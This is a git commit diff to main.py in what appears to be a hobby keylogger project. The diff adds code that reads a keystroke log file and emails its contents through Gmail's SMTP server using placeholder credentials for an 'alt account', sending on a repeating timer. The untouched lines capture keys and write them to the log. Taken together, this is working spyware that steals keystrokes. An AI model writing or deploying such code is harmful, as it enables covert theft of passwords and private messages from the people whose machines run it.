5c793ff361445ca834e6c310f01f269cc5869def
MisticPvP <104326146+MisticPvP@users.noreply.github.com>
2023-04-14 18:47:48 -0400

    Update main.py

--- main.py
+++ main.py
@@ -1,9 +1,32 @@
 import os, getkey
 from getkey import *
-import emailsenn
+import smtplib
+from email.mime.text import MIMEText
+
+with open('LOGS.txt', 'r') as file:
+    data = file.read()
+
+smtp_ssl_host = 'smtp.gmail.com'  # smtp.mail.yahoo.com
+smtp_ssl_port = 465
+email = 'ENTER_ALT_EMAIL' # Your alt acount's email
+password = 'ENTER_PASSWORD' # Password of your alt account
+sender = email
+target = [email] # Must be a list, can enter other emails
+
+msg = MIMEText(data)
+msg['Subject'] = 'logs'
+msg['From'] = sender
+msg['To'] = ', '.join(target)
+
 
 timer = 0
 
+def SendMail():
+  server = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port)
+  msg = MIMEText(data)
+  server.login(email, password)
+  server.sendmail(sender, target, msg.as_string())
+  
 while True:
 
     timer += 1
@@ -24,6 +47,8 @@ while True:
     elif key != '':
       L.write(key)
       L.close()
-    if timer == 10:
-      emailsenn
-      timer = 0
+    if timer == 50:
+      timer  = 0
+      SendMail()
+      
+    
